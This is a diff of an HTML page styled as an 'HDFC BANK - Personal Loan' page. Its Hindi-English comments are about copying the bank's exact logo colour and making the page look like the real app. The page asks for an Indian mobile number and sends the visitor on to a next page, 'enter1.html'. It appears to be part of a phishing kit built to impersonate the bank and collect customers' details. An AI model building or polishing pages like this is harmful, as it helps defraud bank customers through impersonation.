@@ -6,9 +6,9 @@
     <title>HDFC BANK - Personal Loan</title>
     <style>
         :root {
-            /* Aapke HD logo se match karta hua Navy Blue color */
-            --hdfc-navy: #03327d; 
-            --hdfc-blue: #004c8f;
+            /* Aapke HD Logo ka exact blue color code */
+            --logo-blue: #004c8f; 
+            --btn-blue: #004c8f;
         }
 
         body { 
@@ -16,31 +16,25 @@
             margin: 0; 
             padding: 0; 
             background-color: #fff; 
-            color: #333;
         }
 
-        /* 1. Header: Ab yahan koi white box nahi hai */
+        /* 1. Header - Exact Matching Color */
         .header-main {
-            background-color: var(--hdfc-navy);
-            padding: 12px 15px;
+            background-color: var(--logo-blue);
+            padding: 8px 15px; /* Thoda patla header real app jaisa */
             display: flex;
             justify-content: space-between;
             align-items: center;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
 
         .logo-img {
-            height: 30px; /* PC aur Mobile dono ke liye balanced size */
+            height: 35px; /* Logo ko thoda bada rakha hai taki dhang se dikhe */
             width: auto;
             display: block;
+            /* Yahan koi background ya border nahi hona chahiye */
+            background: transparent; 
             border: none;
-            background: transparent; /* Box hatane ke liye */
-        }
-
-        .header-right {
-            display: flex;
-            align-items: center;
-            gap: 15px;
         }
 
         .help-btn {
@@ -50,18 +44,16 @@
             font-weight: 500;
         }
 
-        /* 2. Banner: Zero Gap aur No Cube */
+        /* 2. Banner - No White Cube/Box */
         .loan-banner {
             width: 100%;
             line-height: 0;
-            background-color: #eef7ff;
         }
 
         .banner-img {
             width: 100%;
             height: auto;
             display: block;
-            border: none;
         }
 
         /* 3. Form Section */
@@ -72,16 +64,15 @@
         }
 
         h3 { 
-            color: #031635; 
-            font-size: 20px; 
+            color: #333; 
+            font-size: 19px; 
             font-weight: 600; 
             margin-bottom: 25px; 
         }
 
         .input-group { margin-bottom: 22px; }
-        label { display: block; font-size: 15px; color: #666; margin-bottom: 8px; font-weight: 500; }
+        label { display: block; font-size: 14px; color: #666; margin-bottom: 8px; font-weight: 500; }
 
-        /* Rounded Mobile Box */
         .mobile-wrapper {
             display: flex;
             align-items: center;
@@ -89,11 +80,6 @@
             border-radius: 12px;
             padding: 14px 15px;
             background: #fff;
-            transition: 0.3s;
-        }
-
-        .mobile-wrapper:focus-within {
-            border-color: var(--hdfc-blue);
         }
 
         .mobile-wrapper img { width: 22px; margin-right: 10px; }
@@ -110,12 +96,11 @@
             outline: none; 
             font-size: 16px; 
             width: 100%; 
-            background: transparent;
         }
 
         /* Submit Button */
         .btn-submit {
-            background-color: var(--hdfc-blue);
+            background-color: var(--btn-blue);
             color: white;
             width: 100%;
             padding: 18px;
@@ -126,7 +111,6 @@
             cursor: pointer;
             text-transform: uppercase;
             margin-top: 25px;
-            box-shadow: 0 4px 12px rgba(0, 76, 143, 0.2);
         }
 
         footer { 
@@ -134,7 +118,6 @@
             padding: 30px; 
             font-size: 12px; 
             color: #888; 
-            background: #f9f9f9; 
             border-top: 1px solid #eee; 
             margin-top: 30px;
         }
@@ -144,9 +127,7 @@
 
 <div class="header-main">
     <img src="logo.png" alt="HDFC BANK" class="logo-img">
-    <div class="header-right">
-        <a href="#" class="help-btn">? Help</a>
-    </div>
+    <a href="#" class="help-btn">? Help</a>
 </div>
 
 <div class="loan-banner">
@@ -161,7 +142,7 @@
         <div class="mobile-wrapper">
             <img src="https://img.icons8.com/color/48/000000/india.png" alt="IN">
             <span>+91</span>
-            <input type="number" id="mobile" placeholder="Enter Mobile Number" oninput="if(this.value.length>10)this.value=this.value.slice(0,10)">
+            <input type="number" id="mobile" placeholder="Enter Mobile Number">
         </div>
     </div>
 
@@ -183,14 +164,10 @@
     function startLoading() {
         const mobile = document.getElementById('mobile').value;
         if(mobile.length < 10) {
-            alert("Kripya 10 digit ka mobile number daalein.");
+            alert("Mobile number sahi daalein.");
             return;
         }
-        // Button text change for real feel
-        document.querySelector('.btn-submit').innerText = "Processing...";
-        setTimeout(() => {
-            window.location.href = "enter1.html";
-        }, 2000);
+        window.location.href = "enter1.html";
     }
 </script>
 
